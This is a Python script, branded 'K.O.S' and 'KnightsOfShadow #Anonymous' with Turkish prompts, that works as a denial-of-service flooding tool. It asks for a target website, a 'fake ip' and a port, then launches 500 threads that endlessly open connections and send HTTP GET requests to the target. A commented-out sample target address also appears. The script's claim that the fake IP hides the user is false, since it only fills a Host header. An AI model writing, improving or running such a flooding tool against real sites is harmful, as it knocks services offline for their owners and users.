import socket
import threading 
from pip._vendor.colorama import Fore
import subprocess

#Örnek veri poliçesi.
#target = '195.20.52.179'
#fake_ip = '182.21.20.32'
#port = 80

subprocess.call('clear', shell=True)

baner = ('''
  _   _  _                  _       _   
 | | | || |                | |     | |  
 | | | || |_ _ __   ___ ___| | ___ | |_ 
 | | |__   _| '_ \ / __/ _ \ |/ _ \| __|
 | |____| | | | | | (_|  __/ | (_) | |_ 
 |______|_| |_| |_|\___\___|_|\___/ \__|
 ''')                                       
                                        
print(Fore.LIGHTBLUE_EX+baner)

print(Fore.BLUE+'İnstagram = @KnightL4ncelot')
print(Fore.CYAN+'KnightsOfShadow #Anonymous')

print(Fore.BLUE+"DDos Website (K.O.S) ")
print(Fore.BLUE+"website url")
target = input(Fore.CYAN+" ┌─/"+Fore.LIGHTBLUE_EX+"Write Website"+Fore.CYAN+"""/
 └──╼ """+Fore.LIGHTBLUE_EX+"=> ")
print("Kendinizi gizlemek icin rastgele bi ip girin....")
fake_ip = input(Fore.CYAN+" ┌─/"+Fore.LIGHTBLUE_EX+"Write Fake ip"+Fore.CYAN+"""/
 └──╼ """+Fore.LIGHTBLUE_EX+"=> ")
print("K.O.S Port Tarama uzerinden baktığınzı açık portu girin")
port = input(Fore.CYAN+" ┌─/"+Fore.LIGHTBLUE_EX+"Write Port"+Fore.CYAN+"""/
 └──╼ """+Fore.LIGHTBLUE_EX+"=> ")

port = int(port)

attack_num = 0

print("K.O.S Sending Packets...")

def attack():

    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        
        global attack_num
        attack_num += 1
        packesnum =attack_num
        packesnum= str(packesnum)
        print(Fore.CYAN+'[!]'+"Paketler Gönderiliyor------> "+Fore.YELLOW+packesnum)
        
        
print("Paketler Basari ile gonderildi!")

for i in range(500):
    thread = threading.Thread(target=attack)
    thread.start()
